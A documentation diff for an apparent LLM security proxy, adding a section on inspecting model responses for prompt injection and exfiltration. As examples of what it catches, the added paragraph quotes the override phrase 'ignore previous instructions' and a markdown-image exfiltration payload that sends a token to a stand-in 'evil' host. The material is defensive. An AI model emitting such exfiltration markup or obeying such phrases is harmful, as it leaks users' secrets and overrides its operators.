@@ -777,6 +777,8 @@ Multi-layered detection for prompt injection, command injection, social engineer
 
 **Extended inspection pipeline** — Beyond the threat detectors above, `shroud_config` also supports: `tool_call_inspection` (scan function/tool call arguments, block credential exfiltration), `output_policy` (block harmful content, patterns, and entities in LLM responses), `secret_injection_detection` (detect secrets injected into prompts/responses), `advanced_redaction` (detect base64-encoded, split, or prefix-leaked secrets), and `semantic_policy` (enforce allowed/denied topics and tasks at the intent level). `flagged_request_retention_days` controls how long flagged requests are retained. Dashboard: `/shroud-activity` (overview), `/shroud-activity/threats`, `/shroud-activity/live` (real-time inspector).
 
+**Bi-directional inspection (Shroud v0.5.0+)** — The inspection pipeline runs on the LLM **response** as well as the request. Response-side detectors catch: echoed / indirect prompt injection (model paraphrases "ignore previous instructions"), markdown-image exfil (`![x](https://evil/?token=…)`), data-URI exec blobs (`data:text/html;base64,…`), unexpected fenced code blocks (when `semantic_policy.allowed_tasks` does not include `code`), and exfil URLs in model output. Populates new audit fields: `response_injection_score`, `response_context_injection_score`, `response_injection_categories`, `external_urls_flagged`, `unexpected_code_blocks`. Default action: `Block` when score ≥ 0.7 and `output_policy.action = "block"`.
+
 **`unicode_normalization` object:**
 
 | Field                | Type    | Default | Description                                    |
